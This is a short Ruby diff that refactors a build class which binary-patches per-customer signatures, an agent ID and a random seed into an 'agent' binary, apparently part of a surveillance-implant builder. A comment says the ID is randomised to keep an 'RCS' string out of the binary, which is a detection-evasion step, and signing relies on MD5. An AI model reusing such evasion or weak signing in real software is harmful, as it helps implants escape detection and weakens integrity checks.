@@ -89,6 +89,11 @@ class Build
     FileUtils.rm_rf @core_filepath
   end
 
+  # TODO
+  # def hash_and_salt value
+  #   Digest::MD5.digest(value) + SecureRandom.random_bytes(16)
+  # end
+
   def patch(params)
     # skip the phase if not needed
     return if params.nil? or params[:core].nil?
@@ -121,7 +126,7 @@ class Build
       signature = Digest::MD5.digest(sign.value) + SecureRandom.random_bytes(16)
 
       marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
-      magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+      magic = license_magic + marker.slice(8..-1)
 
       content.binary_patch magic, signature
     rescue Exception => e
@@ -134,8 +139,8 @@ class Build
       # first three bytes are random to avoid the RCS string in the binary file
       id['RCS_'] = SecureRandom.hex(2)
       content.binary_patch 'EMp7Ca7-fpOBIr', id
-    rescue
-      raise "Agent ID marker not found"
+    rescue Exception => e
+      raise "Agent ID marker not found: #{e.message}"
     end
 
     # demo parameters
@@ -147,7 +152,7 @@ class Build
 
     # magic random seed (magic + random)
     begin
-      magic = LicenseManager.instance.limits[:magic] + SecureRandom.urlsafe_base64(32)
+      magic = license_magic + SecureRandom.urlsafe_base64(32)
       magic = magic.slice(0..31)
       content.binary_patch 'B3lZ3bupLuI4p7QEPDgNyWacDzNmk1pW', magic
     rescue
@@ -240,11 +245,15 @@ class Build
     File.join @tmpdir, name
   end
 
+  def license_magic
+    LicenseManager.instance.limits[:magic]
+  end
+
   def add_magic(content)
     # per-customer signature
     begin
       marker = 'ANgs9oGFnEL_vxTxe9eIyBx5lZxfd6QZ'
-      magic = LicenseManager.instance.limits[:magic] + marker.slice(8..-1)
+      magic = license_magic + marker.slice(8..-1)
       content.binary_patch marker, magic
     rescue
       raise "Signature marker not found"
